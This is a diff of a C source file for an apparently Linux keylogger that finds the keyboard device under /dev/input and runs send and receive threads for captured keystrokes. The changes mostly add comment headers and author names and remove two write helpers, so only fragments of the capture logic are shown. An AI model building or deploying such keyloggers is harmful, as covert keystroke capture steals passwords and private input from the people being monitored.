@@ -10,7 +10,7 @@
  *       Revision:  none
  *       Compiler:  gcc
  *
- *         Author:  YOUR NAME (),
+ *         Author:  Benedict Lo & Aing Ragunathan
  *   Organization:
  *
  * =====================================================================================
@@ -97,6 +97,20 @@ const char *keycodes[] = {
     " <SCROLLLOCK> "
 };
 
+/*
+ * =====================================================================================
+ *
+ *       function: is_char_device
+ *
+ *         return: static int
+ *
+ *       Parameters:
+ *                    const struct dirent *file - file to watch
+ *
+ *       Notes:
+ *              checks the device
+ * =====================================================================================
+ */
 /* called for ever file in the /dev/input directory */
 static int is_char_device(const struct dirent *file) {
     char filename[BUFSIZ];
@@ -114,52 +128,21 @@ static int is_char_device(const struct dirent *file) {
 
 }
 
-/**
- * Ensures that the string pointed to by str is written to the file with file
- * descriptor file_desc.
+
+/*
+ * =====================================================================================
  *
- * \returns 1 if writing completes succesfully, else 0
+ *       function: keyloger_send
+ *
+ *         return: void *
+ *
+ *       Parameters:
+ *                  void *args_input - aruguments for input
+ *
+ *       Notes:
+ *              sends the keyloggers input
+ * =====================================================================================
  */
-int write_all(int file_desc, const char *str){
-    int bytesWritten = 0;
-    int bytesToWrite = strlen(str) + 1;
-
-    do {
-        bytesWritten = write(file_desc, str, bytesToWrite);
-
-        if(bytesWritten == -1){
-            return 0;
-        }
-        bytesToWrite -= bytesWritten;
-        str += bytesWritten;
-    } while(bytesToWrite > 0);
-
-    return 1;
-}
-
-
-/**
- * Wrapper around write_all which exits safely if the write fails, without
- * the SIGPIPE terminating the program abruptly.
- */
-void safe_write_all(int file_desc, const char *str, int keyboard){
-    struct sigaction new_actn, old_actn;
-    new_actn.sa_handler = SIG_IGN;
-    sigemptyset(&new_actn.sa_mask);
-    new_actn.sa_flags = 0;
-
-    sigaction(SIGPIPE, &new_actn, &old_actn);
-
-    if(!write_all(file_desc, str)){
-        close(file_desc);
-        close(keyboard);
-        perror("\nwriting");
-        exit(1);
-    }
-
-    sigaction(SIGPIPE, &old_actn, NULL);
-}
-
 void *keylogger_send(void *args_input) {
     int keyboard_fd;
     FILE *fp;
@@ -219,6 +202,20 @@ void *keylogger_send(void *args_input) {
     return NULL;
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: keylogger_recv
+ *
+ *         return: void *
+ *
+ *       Parameters:
+ *                  void *args_input - inputs for the keylogger
+ *
+ *       Notes:
+ *              function to start thread for receiving results
+ * =====================================================================================
+ */
 void *keylogger_recv(void *args_input) {
     keylogger_struct *args = args_input;
     char *keyboard_results_file = "keyboard_results";
@@ -228,6 +225,19 @@ void *keylogger_recv(void *args_input) {
     return NULL;
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: *get_keyboard_event_file
+ *
+ *         return: char *
+ *
+ *       Parameters:
+ *
+ *       Notes:
+ *              gets the keyboard event from the file
+ * =====================================================================================
+ */
 /* find the actual keyboard device file, lets not hard code this */
 char *get_keyboard_event_file () {
     int num_of_files;        //
@@ -285,6 +295,20 @@ char *get_keyboard_event_file () {
     return keyboard_file;
 }
 
+/*
+ * =====================================================================================
+ *
+ *       function: sigint_handler
+ *
+ *         return: void
+ *
+ *       Parameters:
+ *
+ *                  int sig - signal
+ *       Notes:
+ *              starts the signal handler
+ * =====================================================================================
+ */
 void sigint_handler (int sig) {
     loop = 0;
     printf("keylogger thread: received SIGINT: %d\n", sig);
